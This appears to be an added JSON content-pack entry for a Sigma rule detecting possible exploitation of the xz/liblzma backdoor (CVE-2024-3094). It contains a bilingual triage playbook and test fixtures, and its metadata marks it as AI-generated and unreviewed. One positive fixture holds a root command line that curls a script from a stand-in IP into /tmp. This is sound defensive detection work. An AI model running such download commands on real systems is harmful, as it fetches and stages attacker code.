@@ -1,0 +1,133 @@
+{
+  "rule": {
+    "id": "9aa27839-e8ba-4d7a-ac1a-746c22c3d1e5",
+    "title": "Potential Exploitation of CVE-2024-3094 - Suspicious SSH Child Process",
+    "level": "high",
+    "status": "test",
+    "author": "Arnim Rupp, Nasreddine Bencherchali, Thomas Patzke",
+    "path": "2024/Exploits/CVE-2024-3094/proc_creation_lnx_exploit_cve_2024_3094_sshd_child_process.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules-emerging-threats/2024/Exploits/CVE-2024-3094/proc_creation_lnx_exploit_cve_2024_3094_sshd_child_process.yml",
+    "license": "DRL-1.1",
+    "techniques": [],
+    "folder": "rules-emerging-threats"
+  },
+  "playbook": {
+    "es": {
+      "summary": "sshd lanzó un proceso hijo como root cuya línea de comandos empieza con \"bash -c\" o \"sh -c\". Puede indicar explotación del backdoor de xz/liblzma (CVE-2024-3094), que ejecuta comandos remotos a través de sshd.",
+      "what_it_detects": "Eventos process_creation en Linux donde ParentImage termina en /sshd, CommandLine empieza con \"bash -c\" o \"sh -c\" y User es root. Este patrón coincide con la demostración pública xzbot del backdoor.",
+      "why_it_matters": "CVE-2024-3094 es un backdoor en xz-utils 5.6.0 y 5.6.1. La biblioteca liblzma comprometida se carga en sshd y permite que quien tenga la clave del atacante ejecute comandos como root antes de autenticarse (ATT&CK Execution: Command and Scripting Interpreter, Unix Shell).",
+      "triage_steps": [
+        "Revise CommandLine completo: comandos de reconocimiento, descargas (curl/wget), shells reversos o escritura en /tmp indican actividad maliciosa.",
+        "Verifique la versión de xz/liblzma en el host (xz --version, gestor de paquetes); las versiones 5.6.0 y 5.6.1 son vulnerables.",
+        "Busque en auth.log o journal de sshd, dentro de +/- 15 minutos, un 'Accepted' para root. Si no hay login exitoso asociado, sospeche del backdoor.",
+        "Identifique la IP de origen de las conexiones SSH a esa hora y si es de administración conocida o externa.",
+        "Revise los procesos hijos y nietos del shell, conexiones de red nuevas y archivos creados por root en la misma ventana.",
+        "Busque persistencia: claves nuevas en /root/.ssh/authorized_keys, cron, unidades systemd y usuarios agregados.",
+        "Consulte alertas previas del mismo host y de la misma IP de origen."
+      ],
+      "false_positives": [
+        "Administradores que se conectan directamente como root y ejecutan comandos remotos (ssh root@host 'comando'), que sshd lanza como \"bash -c\".",
+        "Herramientas de automatización (Ansible, scripts de backup, monitoreo) que usan SSH como root para ejecutar comandos.",
+        "Ejecuciones de \"sh -c\" desde sshd para ForceCommand o subsistemas configurados por el equipo de sistemas."
+      ],
+      "response_steps": [
+        "Confirme con el responsable del host si la sesión root y el comando eran esperados; documente la IP de origen y la cuenta.",
+        "Si no hay justificación, aísle el host de la red, conservando memoria y logs para el análisis forense.",
+        "Actualice o revierta xz-utils a una versión no afectada y reinicie sshd; bloquee la IP de origen en el perímetro.",
+        "Si hay indicios de compromiso, rote claves SSH y credenciales, elimine la persistencia y considere reconstruir el host desde una imagen confiable."
+      ],
+      "severity_rationale": "El nivel high es adecuado: un shell root sin login exitoso que lo explique sugiere ejecución remota pre-autenticación, aunque la administración root legítima puede generar el mismo patrón."
+    },
+    "en": {
+      "summary": "sshd spawned a root child process whose command line starts with \"bash -c\" or \"sh -c\". This may indicate exploitation of the xz/liblzma backdoor (CVE-2024-3094), which runs remote commands through sshd.",
+      "what_it_detects": "Linux process_creation events where ParentImage ends with /sshd, CommandLine starts with \"bash -c\" or \"sh -c\", and User is root. The pattern matches the public xzbot backdoor demonstration.",
+      "why_it_matters": "CVE-2024-3094 is a backdoor in xz-utils 5.6.0 and 5.6.1. The compromised liblzma loads into sshd and lets the holder of the attacker's key run commands as root before authentication (ATT&CK Execution: Unix Shell).",
+      "triage_steps": [
+        "Read the full CommandLine: reconnaissance, downloads (curl/wget), reverse shells or writes to /tmp point to malicious activity.",
+        "Check the xz/liblzma version on the host (xz --version, package manager); 5.6.0 and 5.6.1 are vulnerable.",
+        "Search sshd auth.log or journal within +/- 15 minutes for an 'Accepted' root login. No matching successful login strongly suggests the backdoor.",
+        "Identify the source IP of SSH connections at that time and whether it is a known admin system or external.",
+        "Review child and grandchild processes, new network connections and files created by root in the same window.",
+        "Hunt for persistence: new keys in /root/.ssh/authorized_keys, cron jobs, systemd units, added users.",
+        "Check earlier alerts for the same host and source IP."
+      ],
+      "false_positives": [
+        "Administrators logging in directly as root and running remote commands (ssh root@host 'cmd'), which sshd launches as \"bash -c\".",
+        "Automation tools (Ansible, backup scripts, monitoring) running commands over SSH as root.",
+        "\"sh -c\" executions from sshd for ForceCommand or subsystems configured by the systems team."
+      ],
+      "response_steps": [
+        "Confirm with the host owner whether the root session and command were expected; record source IP and account.",
+        "If unexplained, isolate the host from the network while preserving memory and logs for forensics.",
+        "Upgrade or roll back xz-utils to an unaffected version and restart sshd; block the source IP at the perimeter.",
+        "If compromise is indicated, rotate SSH keys and credentials, remove persistence and consider rebuilding from a trusted image."
+      ],
+      "severity_rationale": "High fits: a root shell from sshd with no explaining login suggests pre-authentication remote execution, though legitimate root administration can produce the same pattern."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "sshd spawns a root sh -c command writing id output to /tmp, as in the xzbot demo",
+        "event": {
+          "Image": "/usr/bin/dash",
+          "ParentImage": "/usr/sbin/sshd",
+          "CommandLine": "sh -c id > /tmp/.xz",
+          "User": "root",
+          "ProcessId": 48213,
+          "ParentProcessId": 48210,
+          "CurrentDirectory": "/",
+          "Computer": "bastion-01"
+        }
+      },
+      {
+        "description": "sshd spawns a root bash -c command running a download",
+        "event": {
+          "Image": "/usr/bin/bash",
+          "ParentImage": "/usr/sbin/sshd",
+          "CommandLine": "bash -c curl -s http://203.0.113.45/a.sh -o /tmp/a.sh",
+          "User": "root",
+          "ProcessId": 51002,
+          "ParentProcessId": 50998,
+          "CurrentDirectory": "/",
+          "Computer": "srv-web-03"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Remote command via SSH run by a non-root service account",
+        "event": {
+          "Image": "/usr/bin/bash",
+          "ParentImage": "/usr/sbin/sshd",
+          "CommandLine": "bash -c uptime",
+          "User": "deploy",
+          "ProcessId": 30117,
+          "ParentProcessId": 30110,
+          "CurrentDirectory": "/home/deploy",
+          "Computer": "bastion-01"
+        }
+      },
+      {
+        "description": "Interactive root login shell from sshd, not a -c command",
+        "event": {
+          "Image": "/usr/bin/bash",
+          "ParentImage": "/usr/sbin/sshd",
+          "CommandLine": "-bash",
+          "User": "root",
+          "ProcessId": 30544,
+          "ParentProcessId": 30540,
+          "CurrentDirectory": "/root",
+          "Computer": "bastion-01"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-30T20:24:06+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
